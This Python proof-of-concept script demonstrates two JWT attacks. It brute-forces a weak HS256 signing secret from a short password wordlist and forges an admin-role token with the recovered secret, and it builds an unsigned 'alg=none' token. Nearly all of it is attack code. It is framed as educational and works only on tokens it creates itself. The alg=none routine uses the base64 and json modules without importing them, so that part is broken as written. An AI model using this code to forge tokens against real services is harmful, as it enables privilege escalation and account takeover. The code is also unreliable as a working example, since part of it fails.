#!/usr/bin/env python3
"""
jwt_attack_demo.py
Demonstrates two common JWT pitfalls:
  1) Weak-secret brute-forcing for HS256-signed tokens
  2) The classic "alg=none" attack (PoC only; the real vuln is a server that accepts 'none')
Requires: pyjwt (pip install pyjwt)
Usage:
  python jwt_attack_demo.py --demo weaksecret
  python jwt_attack_demo.py --demo none
"""
import argparse, sys, time
from typing import Optional, Tuple, List

try:
    import jwt  # PyJWT
except Exception as e:
    print("PyJWT is required. Please install with: pip install pyjwt")
    sys.exit(1)

# --- Utilities ---

def make_hs256_token(payload: dict, secret: str) -> str:
    return jwt.encode(payload, secret, algorithm="HS256")

def verify_hs256_token(token: str, secret: str) -> dict:
    # Raises if invalid
    return jwt.decode(token, secret, algorithms=["HS256"])

def brute_force_secret(token: str, candidates: List[str]) -> Optional[str]:
    for guess in candidates:
        try:
            jwt.decode(token, guess, algorithms=["HS256"])
            return guess
        except Exception:
            continue
    return None

def wordlist_small() -> List[str]:
    # A tiny list to keep the demo fast. In real attacks, attackers use massive lists.
    return [
        "password", "123456", "qwerty", "letmein", "welcome",
        "admin", "secret", "iloveyou", "dragon", "monkey",
        "test", "summer", "hello", "freedom", "whatever"
    ]

# --- Demos ---

def demo_weak_secret() -> None:
    print("[*] Generating a JWT signed with a WEAK secret ('secret')...")
    weak_secret = "secret"
    victim_payload = {"sub": "user123", "role": "user", "iat": int(time.time())}
    token = make_hs256_token(victim_payload, weak_secret)
    print("[+] Victim token:", token)

    print("\n[*] Attempting to brute-force the secret from a small wordlist...")
    wl = wordlist_small()
    found = brute_force_secret(token, wl)
    if found:
        print(f"[+] SUCCESS! Secret recovered from wordlist: '{found}'")
        print("[*] Now forging an 'admin' token using the recovered secret...")
        forged_payload = {"sub": "user123", "role": "admin", "iat": int(time.time())}
        forged = make_hs256_token(forged_payload, found)
        print("[+] Forged admin token:", forged)
        # Verify we can decode using the same (found) secret
        decoded = verify_hs256_token(forged, found)
        print("[+] Decoded forged token payload:", decoded)
    else:
        print("[-] Failed to recover the secret from this tiny wordlist. Try a larger list.")

def base64url_encode(raw: bytes) -> str:
    return base64.urlsafe_b64encode(raw).rstrip(b'=').decode('ascii')

def demo_alg_none() -> None:
    print("[*] Building a JWT with alg='none' (unsigned).")
    header = {"alg": "none", "typ": "JWT"}
    payload = {"sub": "user123", "role": "admin", "iat": int(time.time())}

    header_b64 = base64url_encode(json.dumps(header, separators=(',', ':')).encode())
    payload_b64 = base64url_encode(json.dumps(payload, separators=(',', ':')).encode())
    unsigned_token = f"{header_b64}.{payload_b64}."  # Note trailing dot, no signature

    print("[+] Unsigned token:", unsigned_token)
    print("\n[!] IMPORTANT: This token is NOT secure. It only works if a vulnerable server accepts alg='none'.")
    print("[!] Modern libraries reject alg='none' by default; the vulnerability is server misconfiguration.")

def main():
    parser = argparse.ArgumentParser()
    parser.add_argument("--demo", choices=["weaksecret", "none"], required=True,
                        help="Which PoC to run")
    args = parser.parse_args()

    if args.demo == "weaksecret":
        demo_weak_secret()
    elif args.demo == "none":
        demo_alg_none()
    else:
        print("Unknown demo")

if __name__ == "__main__":
    main()
